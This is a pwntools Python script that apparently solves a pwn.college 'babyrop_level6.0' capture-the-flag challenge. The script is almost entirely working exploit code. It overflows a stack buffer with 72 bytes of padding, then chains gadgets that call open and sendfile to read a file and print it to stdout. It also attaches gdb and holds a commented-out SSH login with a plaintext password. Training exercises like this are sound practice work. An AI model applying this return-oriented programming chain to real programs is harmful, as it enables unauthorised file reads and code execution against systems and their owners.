from pwn import *

context.arch = 'amd64'
context.os = 'linux'
context.terminal = ['tmux', 'splitw', '-h']
FILE = '/home/darkstar/Downloads/temp'
remoteFILE = '/challenge/babyrop_level6.0'
elf = ELF(FILE)
rop = ROP(elf)

open_plt = elf.plt.get('open')
sendfile_plt = elf.plt.get('sendfile')
ret_gadget = rop.find_gadget(['ret'])
challenge = elf.symbols['challenge']

print(f"open@plt: {hex(open_plt) if open_plt else 'Not found'}")
print(f"sendfile@plt: {hex(sendfile_plt) if sendfile_plt else 'Not found'}")

call_str = next(elf.search(b'call'))

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])
pop_rdx = rop.find_gadget(['pop rdx', 'ret'])
pop_rax = rop.find_gadget(['pop rax', 'ret'])

rop.raw(pop_rdi)
rop.raw(call_str)
rop.raw(pop_rsi)
rop.raw(0)
rop.raw(open_plt)

rop.raw(pop_rdi)
rop.raw(1)
rop.raw(pop_rsi)
rop.raw(3)
rop.raw(pop_rdx)
rop.raw(0)
rop.raw(sendfile_plt)
rop.raw(challenge)

#conn = ssh(host='pwn.college', user='hacker', port=22, password='425192')
p = process(FILE)
gdb.attach(p, '''
    b *challenge+286
    continue
''')
p.recvuntil(b'\n')

payload = b'A'*72
payload += rop.chain()

hex_payload = ''.join(f'\\x{byte:02x}' for byte in payload)
print("Payload in hex: ")
print(hex_payload)

p.sendline(payload)

p.interactive()

#conn.close()
